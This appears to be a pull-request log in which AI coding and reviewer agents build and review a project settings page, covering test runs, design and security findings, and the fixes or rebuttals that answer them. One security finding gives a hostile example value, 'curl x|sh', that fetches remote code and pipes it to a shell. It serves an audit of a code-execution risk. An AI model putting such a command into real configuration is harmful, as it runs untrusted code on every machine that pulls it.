# Pull Requests

| Pull Request Number | Pull Request Name | Status |
| ------------------: | :---------------- | -----: |
| 240 | [\[058.00\](A) Project Settings Page](https://github.com/kigster/openlanes/pull/240) | Open 🟡 |

## Frontend, round 1 (frontend-coder)

- `npx vitest run`: 603 tests pass; 6 files fail to load (`@xyflow/react`, `@dagrejs/dagre` absent from the shared node_modules used here). Baseline, not from this plan.
- `npx eslint .` and `npm run typecheck`: clean apart from the same missing modules.
- Cypress `web/cypress/e2e/settings.cy.ts` written (temp repo + bare origin via `web/cypress/support/settingsRepo.ts`, registered in `cypress.config.ts`) but NOT run: it needs the back-end routes (B3) and Redis. Run `just web-e2e`.

## Integration proof, backend-coder round 2 (2026-11-13)

    bundle exec rspec spec/openlanes/web/settings_spec.rb spec/openlanes/web/settings_save_spec.rb spec/openlanes/web/settings_api_spec.rb
    → 31 examples, 0 failures

    (cd "$tmp" && exe/openlanes web --demo --no-open --port 11158 --redis-url redis://localhost:6379/12 --dir "$tmp/.plans") &
    cd web && npx cypress run --spec cypress/e2e/settings.cy.ts --config baseUrl=http://127.0.0.1:11158 --env plansDir=$tmp/.plans
    → 5 tests, 4 passing, 1 failing: "commits and pushes an edit to jobs, and the board reads it".
      PUT /api/settings answered 200 and the push landed; the page's `.set-status` note never shows,
      because SettingsPage.tsx keys SettingsForm by etag and the refetch remounts it. Front-end fix, mailed to frontend-coder (#4).

Fixed on the way (outside backend-coder's files, mailed to frontend-coder):
- `bin/web-e2e` starts both demo servers from the temp project, so a settings save commits and pushes the temp repo, never this one.
- `web/cypress/support/settingsRepo.ts` turns off `commit.gpgsign` in the temp repo.

## Full suite, backend-coder round 2

    bundle exec rspec   → 6675 examples, 1 failure: architecture_doc_spec (docs/architecture stale for the new Settings classes)
    just update-architecture; bundle exec rspec spec/openlanes/docs/architecture_doc_spec.rb → 2 examples, 0 failures
    bundle exec rubocop → 998 files inspected, no offenses detected

## Frontend, round 2 (frontend-coder)

Fix: the saved note vanished because the form is keyed by etag and remounted on the refetch (backend-coder's finding). The mutation and the note now live in `SettingsPage`; a test covers the remount.

- `cd web && npx vitest run`: 68 files, 655 tests, 0 failures (the missing-module baseline failures are gone with the real `node_modules`).
- `npx eslint .` and `npm run typecheck`: clean.
- `npm run build && bin/web-e2e`: 12 specs, 61 tests, all passing, including `settings.cy.ts` 5/5.
- `bundle exec rubocop`: 998 files, no offenses. `bundle exec rspec`: 2949 examples, 0 failures.
- Reviewed backend-coder's edits outside its area (`bin/web-e2e` servers run from the temp project; `commit.gpgsign false` in `settingsRepo.ts`): both are right.

## Findings: design-reviewer

### F201 [minor] lib/openlanes/web/settings.rb:121
`parser_problem` recovers the key a `Config.parse` refusal names by regex over the message text (`/\A([a-z_]+(?:\.[\w-]+)*)[: ]/`, then a `KEYS.find` word match). The page's field placement is coupled to the wording of another class's error strings. Scenario: someone rewords a `Config.parse` message ("jobs must be at least 1" to "expected jobs >= 1"); the dotted-path regex still matches `jobs` by luck, but a message whose first word is not the key (or mentions two keys, e.g. a `merge`/`ci` conflict) lands on the wrong field or on `[]`, and the refusal shows as an orphan list instead of on its field, with no spec failing. Expected: `Config` raises an error carrying the key path, and `Settings` reads it.

### F202 [minor] lib/openlanes/web/settings_save.rb:150
`SettingsSave` carries its own `git`/`git!` Open3 wrappers, and `Settings.branch` has a second Open3 git call, while `Vcs` is the namespace that owns git (worktree, publisher, github seam), and `Web::Settings` is reached by `SettingsSave` for `branch` and `etag` (a model class doing git I/O for the writer). Scenario: the next change to how the harness runs git (env scrubbing, `GIT_*` vars, a timeout) is made in `Vcs` and silently does not apply to the save path, which pushes `main`. Expected: reach git through a `Vcs` facade method (and `Execution::Boundary` likewise via its facade rather than the class directly), and keep `Settings` free of process calls.

### F203 [minor] web/src/settings/SettingsPage.tsx:30
Form-state logic that belongs in `model.ts` sits inline: the recursive `collect` computing the set of shown paths, and the split of state between `SettingsPage` (mutation, note) and `SettingsForm` (draft, field errors, refusal), which exists only because the form is keyed by etag. Scenario: a next change that adds a field-level concern (e.g. a "dirty" marker or a new refusal) has to decide which of the two components owns it, and a refusal set in the form is lost on the remount a refetch causes while the note survives, so the two messages behave differently. Expected: pull `shownPaths(panes)` into `model.ts`, and keep all post-save messages (note, refusal, errors) on one side of the remount.

### F204 [minor] web/src/settings/settings.css:11
`#c0392b` is written three times for the error colour while the rest of the file uses the page's variables (`--hairline`, `--plate`, `--ink-soft`). Scenario: a theme change to the error colour updates the board but not this page. Expected: a shared error variable.

## Findings: design-reviewer

### F201 [minor] lib/openlanes/web/settings.rb:121
`parser_problem` recovers the key a `Config.parse` refusal names by regex over the message text (`/\A([a-z_]+(?:\.[\w-]+)*)[: ]/`, then a `KEYS.find` word match), so the page's field placement is coupled to the wording of another class's error strings. Scenario: a `Config.parse` refusal whose first word is not the key, or that names two keys, lands on the wrong field or on `[]`; it then shows in the orphan list instead of on its field, and no spec fails. Expected: `Config` raises an error carrying the key path, and `Settings` reads that.

### F202 [minor] lib/openlanes/web/settings_save.rb:150
`SettingsSave` carries its own `git`/`git!` Open3 wrappers and `Settings.branch` has a second Open3 git call, though `Vcs` owns git here. A model (`Settings`) also does process I/O for the writer. `Execution::Boundary` is reached as a class, not through the `Execution` facade. Scenario: a later change to how the harness runs git (env scrubbing, a timeout) is made in `Vcs` and does not reach the save path, which pushes `main`. Expected: go through a `Vcs` facade method, and keep `Settings` free of process calls.

### F203 [minor] web/src/settings/SettingsPage.tsx:30
The recursive `collect` that builds the set of shown paths is inline in the component and belongs in `model.ts`. State is also split across the etag-keyed remount: the mutation and note live in `SettingsPage`, while the draft, field errors and refusal live in `SettingsForm`. Scenario: a 409 refusal set in the form is lost when the refetch remounts it, while the success note survives, so the two messages behave differently and the next added message has to pick a side. Expected: `shownPaths(panes)` in `model.ts`, and all post-save messages on one side of the remount.

### F204 [minor] web/src/settings/settings.css:11
`#c0392b` is written three times for the error colour while the rest of the file uses the page's variables (`--hairline`, `--plate`, `--ink-soft`). Scenario: a theme change to the error colour reaches the board but not this page. Expected: one shared variable.

## Findings: security-reviewer

### F101 [minor] lib/openlanes/web/settings_save.rb:60
🔓 Security Concern. `PUT /api/settings` lets any caller holding the board's CSRF token write fields the harness later executes as shell (`coverage.command`, `coverage.report_command`) and push them to `origin/main`, where every worktree and CI picks them up. Default loopback binding plus Host allow-list plus CSRF closes this; it matters only with `--bind 0.0.0.0`, where one shared admin login (or none, for a bare `--bind` without `--admin-credentials`) now means code execution on every machine that pulls main. Scenario: LAN user with the admin login PUTs `coverage.report_command: "curl x|sh"`; it is committed and pushed. Not exploitable in the default setup; consider an extra confirmation or refusing the page when bound beyond loopback.

### F102 [minor] lib/openlanes/web/settings_save.rb:160
🤔 `git!` raises `Error` with the absolute checkout path and raw git output; the PUT route does not rescue it, so a git failure in `land` (for example `commit` failing on a hook) surfaces as a 500 whose body may carry the path and hook output. Also `Boundary.sanction` is never revoked when `undo!` runs after a failed push, so the dropped commit's sha stays sanctioned. Low impact; rescue `Error` in the route and answer a fixed message.

## Findings: staff-reviewer

### F1 [minor] web/cypress/e2e/settings.cy.ts:50
Spec and plan F4 require "the board's next snapshot reads the new value"; the Cypress test asserts `/api/settings` (which re-reads the file) instead of `/api/board`. The board's `jobs` comes from `@board.jobs` (`lib/openlanes/live/snapshot.rb:129`), i.e. the running dispatcher, not `.openlanes.yml`. Scenario: save `jobs: 5` while a run is live with `jobs: 2`; expected per spec: next board snapshot shows 5; actual: unverified, and very likely still 2 until the run restarts. Either prove it against `/api/board` or amend spec/plan to say what "reads" means.

### F2 [minor] lib/openlanes/web/settings_save.rb:116
`land` writes the file, then `git!("commit", ...)` raises `OpenLanes::Error` on failure (gpg signing, a pre-commit hook, an `index.lock` from a concurrent save). Nothing rescues it, so the route answers 500 and `.openlanes.yml` stays modified (and staged) in the main checkout. Scenario: global `commit.gpgsign true` with a locked agent (already hit in the e2e seed); expected: 409 and nothing written, as the contract promises; actual: 500, dirty file, and every later save refused as `dirty_config`. Suggest wrapping write+commit in the same `undo`-style restore as `push_failed`.

### F3 [minor] web/src/settings/Field.tsx:29
A boolean toggle renders `Boolean(value ?? fallback)` and only ever emits `true`/`false`, so once touched a key can never return to unset (the select and text fields can). Scenario: `frontend` unset, click twice; expected: back to unset/no change; actual: `frontend: false` written explicitly, and the "Nothing changed" short-circuit no longer applies.

## Answers, round 3 (backend-coder)

Findings live in this file, not as PR review comments (`gh api .../pulls/240/comments` returns none), so they are answered here.

- F2 (staff-reviewer) — fix. `SettingsSave#commit!` (`lib/openlanes/web/settings_save.rb`) restores the file and index when `git add`/`git commit` fails and answers 409 `commit_failed`, so the next save is not refused as `dirty_config`. Spec: `settings_save_spec.rb` "restores the file and answers 409 when the commit itself fails" (pre-commit hook exits 1). `contract.md` and `openapi.yaml` amended. Mailed frontend-coder about the new refusal.
- F102 (security-reviewer) — fix, in part. Any other git failure answers 500 with a fixed sentence; git's words go to the server log only. The same spec checks that the reason carries neither the checkout path nor the hook's output. Rebuttal on the second half: `Boundary.sanction` records the sha of the commit about to be pushed. `undo!` resets that commit away, so no ref points at it and a later push cannot move `origin/main` to it by accident. Leaving the entry in place lets nothing new through.
- F1 (staff-reviewer) — rebuttal, with a proposed amendment to the spec. The board's `jobs` is the running dispatcher's (`live/snapshot.rb:129`, `@board.jobs`). A run reads `.openlanes.yml` once, at start, and does not change its settings mid-run. That is deliberate: worktrees and agents already started keep consistent settings. So "the board's next snapshot reads the new value" holds for the next run, and for the page's own GET, which `settings.cy.ts` asserts. Hot-reloading a live run's config would be a new feature, not part of plan 058. Proposed wording for the spec: "the next run, and the settings page on reload, read the new value."
- F201 (design-reviewer) — not fixed this round. This is a design change outside the rejected scope. Giving `Config.parse` a structured error that carries the key path changes an error type that every `Config` caller sees. `parser_problem` only runs when the JSON schema finds nothing. The schema catches every type, enum and range refusal, so the regex path is a fallback for cross-key rules. Suggested as a follow-up plan.
- F202 (design-reviewer) — not fixed this round, for the same scope reason. Moving the save's git calls behind a `Vcs` facade method is a refactor of the namespace that pushes for the whole harness. Suggested as a follow-up together with F201.
- F3, F203, F204 — front end, frontend-coder's half.

## Answers, round 3 (frontend-coder)

- F3 (staff-reviewer) — fix. `Field.tsx`: a toggle set back to the default emits `null` (unset), so a key can return to unset and "Nothing changed" applies again. Test: `Field.test.tsx` "returns a toggle to unset when it is set back to the default".
- F203 (design-reviewer) — fix. `shownPaths(panes)` moved into `model.ts`; note, refusal and field errors now live together in `SettingsPage`, above the etag-keyed remount. `SettingsRefusalKind` gained `commit_failed`.
- F204 (design-reviewer) — fix. `settings.css` uses one `--set-alarm` (the palette's `--alarm`, with a fallback) instead of three literal colours.
- Proof: vitest 656 pass; eslint and tsc clean; `bin/web-e2e` 61/61 (settings.cy.ts 5/5); rubocop clean.

## Checks, backend-coder round 3

    bundle exec rspec spec/openlanes/web/        → 332 examples, 0 failures
    bundle exec rspec spec/openlanes/docs/architecture_doc_spec.rb → 2 examples, 0 failures
    bundle exec rubocop                          → 998 files inspected, no offenses detected
    bundle exec rspec (seed 15821)               → stopped at the 10-minute background limit after 5821 examples passed, 0 failures, 0 errors. Not a full run; the next round reruns it before signing Completed.

## Checks, backend-coder round 4 (after frontend-coder's round 3)

    bundle exec rspec    → 6676 examples, 0 failures (seed 25284, 10 min 49 s), exit 0
    bundle exec rubocop  → 998 files inspected, no offenses detected, exit 0
